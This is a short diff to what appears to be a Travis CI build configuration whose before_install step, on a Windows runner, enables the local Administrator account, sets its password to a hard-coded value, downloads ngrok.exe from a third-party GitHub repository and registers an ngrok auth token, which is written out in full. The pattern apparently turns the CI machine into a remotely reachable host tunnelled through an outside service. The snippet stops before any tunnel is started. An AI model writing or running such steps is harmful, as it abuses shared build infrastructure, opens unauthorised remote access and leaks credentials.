@@ -4,6 +4,7 @@ language: shell
 
 before_install:
 - |-
+        powershell Get-LocalUser -Name "Administrator" | Enable-LocalUser
         net user Administrator Thuonghai001 > nul
         curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
         powershell ./ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
